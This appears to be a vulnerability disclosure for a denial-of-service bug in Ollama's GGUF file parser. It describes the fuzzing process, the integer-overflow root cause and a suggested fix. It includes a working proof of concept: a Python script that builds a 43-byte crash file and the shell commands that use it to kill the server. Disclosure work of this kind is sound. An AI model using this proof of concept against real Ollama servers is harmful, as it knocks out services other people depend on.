# Ollama GGUF Parser — DoS via Integer Overflow

**Target:** [ollama/ollama](https://github.com/ollama/ollama)
**Version tested:** 0.18.2
**Date:** March 2026
**Severity:** High (CVSS 7.5)
**Status:** Vulnerability confirmed; known issue [CVE pending](https://huntr.com/repos/ollama/ollama) — independently reproduced with a different attack vector

---

## Summary

The GGUF file parser in Ollama does not validate string length fields before operating on them. By crafting a 43-byte GGUF file with a header declaring 100 tensors and 100 KV pairs followed by random bytes, an attacker can trigger a Go runtime panic that **crashes the entire Ollama server process**.

The specific crash observed is an integer overflow: a random `uint64` key-length value causes `8 + length` to overflow `int64`, producing a negative slice index.

```
panic: runtime error: slice bounds out of range [:-4441803743202727513]

github.com/ollama/ollama/fs/ggml.readGGUFString(...)
    fs/ggml/gguf.go:363
github.com/ollama/ollama/fs/ggml.(*gguf).Decode(...)
    fs/ggml/gguf.go:144
```

---

## Research Process

### Phase 1 — API Surface Enumeration

Built [`02_api_security_tester.py`](./02_api_security_tester.py) to test 45 checks across 6 categories:

| Category | Tests | Result |
|----------|-------|--------|
| Endpoint enumeration | 20 | 4 warnings (unauthenticated read endpoints — by design) |
| SSRF via `/api/pull` | 7 | ✅ All blocked |
| Path traversal | 10 | ✅ All blocked |
| Denial of Service | 2 | ✅ Survived |
| Information disclosure | 2 | Informational |
| Prompt injection | 1 | Skipped (no model loaded) |

**Finding:** API layer is well-hardened. The unauthenticated endpoints (`/api/tags`, `/api/ps`, `/v1/models`) are by design for a local-first tool and present no risk in the default localhost-only configuration.

### Phase 2 — GGUF Fuzzing

Built [`01_gguf_fuzzer.py`](./01_gguf_fuzzer.py) generating 22 malformed GGUF files across 7 categories:

| Category | Tests |
|----------|-------|
| Minimal/empty files | t01–t04 |
| Invalid header values (version 0, MAX_UINT32, MAX_UINT64 counts) | t05–t09 |
| Wrong magic bytes | t10–t12 |
| Metadata injection (invalid type, 100KB key, length overflow) | t13–t15 |
| Special characters (path traversal, null bytes, cmd injection) | t16–t18 |
| Integer overflow in tensor info | t19–t20 |
| Valid header + random garbage | t21–t22 |

Built [`monitor_and_test.sh`](./monitor_and_test.sh) to run all tests with live log monitoring, crash detection, and timing.

### Phase 3 — Crash Confirmed

**`t21_valid_header_garbage`** crashed Ollama:

- Valid GGUF header (version 3, 100 tensors, 100 KV pairs)
- Followed by 4KB of random bytes
- `readGGUFString` reads bytes 24–31 as `uint64` key length
- Value `3,185,249,393,515,957,305` → arithmetic `8 + n` overflows `int64`
- Go runtime panics with negative slice index

**Key observation:** `ollama create` returns **exit code 0** (success) while the server is already dead. The client gets no indication of the crash.

### Phase 4 — Minimization

Binary search to find the smallest trigger:

| Bytes after header | Crash? |
|-------------------|--------|
| 16 (zeros) | ❌ No (zeros decode gracefully) |
| 17 (random) | ❌ No |
| 18 (random) | ❌ No |
| **19 (random)** | **✅ CRASH** |
| 20–4096 (random) | ✅ CRASH |

**Minimum PoC: 43 bytes total** (24-byte header + 19 random bytes).

### Phase 5 — Reproducibility

Confirmed **2/3 fresh runs** crash Ollama. The 1 miss was a cached blob run (parser skipped on cache hit — Ollama uses the stored blob without re-parsing).

---

## Proof of Concept

### Generate the PoC file

```python
import struct, random

GGUF_MAGIC = b'GGUF'
header = GGUF_MAGIC + struct.pack('<I', 3) + struct.pack('<Q', 100) + struct.pack('<Q', 100)
random.seed(42)
poc = header + bytes([random.randint(0, 255) for _ in range(19)])

with open('poc_crash.gguf', 'wb') as f:
    f.write(poc)

with open('poc_crash.Modelfile', 'w') as f:
    f.write('FROM ./poc_crash.gguf\n')
```

Pre-generated PoC: [`poc_crash.gguf`](./poc_crash.gguf)
SHA256: `b6e437240c77cb8ff9463e51dbb4eb7d9b6adde07f0415486a3cc8882bc7717d`
Size: **43 bytes**

### Reproduce the crash

```bash
# Terminal 1 — start Ollama with debug logging
OLLAMA_DEBUG=1 ollama serve 2>&1 | tee /tmp/ollama.log

# Terminal 2 — trigger the crash
cd ollama-gguf-fuzzing
ollama create crash-test -f poc_crash.Modelfile

# Verify Ollama is dead
curl http://localhost:11434   # → Connection refused

# Check the panic in logs
grep "panic" /tmp/ollama.log
```

### Expected output

```
panic: runtime error: slice bounds out of range [:-4441803743202727513]

goroutine 271 [running]:
github.com/ollama/ollama/fs/ggml.readGGUFString(...)
    github.com/ollama/ollama/fs/ggml/gguf.go:363 +0x184
github.com/ollama/ollama/fs/ggml.(*gguf).Decode(...)
    github.com/ollama/ollama/fs/ggml/gguf.go:144 +0xa8
github.com/ollama/ollama/fs/ggml.(*containerGGUF).Decode(...)
    github.com/ollama/ollama/fs/ggml/gguf.go:66 +0x17c
```

---

## Root Cause

**File:** `github.com/ollama/ollama/fs/ggml/gguf.go`, function `readGGUFString` (~line 363)

The function reads a `uint64` string length from the file without validating it:

```go
// Vulnerable pattern:
n := binary.LittleEndian.Uint64(buf)
s = string(buf[8 : 8+n])  // panic if 8+n overflows int64
```

When `n = 3,185,249,393,515,957,305`, the expression `8+n = 3,185,249,393,515,957,313` overflows `int64` → negative slice bound → Go runtime panic.

The panic occurs in a goroutine spawned by `CreateHandler` without a `recover()`, so the **entire process exits**.

**Suggested fix:**

```go
const maxStringLen = 1 << 20 // 1MB
if n > maxStringLen {
    return "", fmt.Errorf("GGUF string length %d exceeds limit", n)
}
```

---

## Impact

| Config | Impact |
|--------|--------|
| Default (`localhost`) | Local DoS — any process on the machine can kill Ollama |
| `OLLAMA_HOST=0.0.0.0` | **Unauthenticated remote DoS** — no credentials required |

The silent `exit code 0` from `ollama create` makes the crash harder to detect in automated pipelines.

---

## Tools

| File | Description |
|------|-------------|
| `01_gguf_fuzzer.py` | Generates 22 malformed GGUF test files |
| `02_api_security_tester.py` | Tests 45 API security checks across 6 categories |
| `monitor_and_test.sh` | Runs all GGUF tests with live crash detection |
| `poc_crash.gguf` | Minimal 43-byte crash trigger |
| `poc_crash.Modelfile` | Ollama Modelfile for the PoC |

---

## Environment

- **OS:** macOS Darwin 25.3.0 (Apple M4)
- **Ollama:** 0.18.2 via Homebrew
- **Python:** 3.x (no external dependencies)
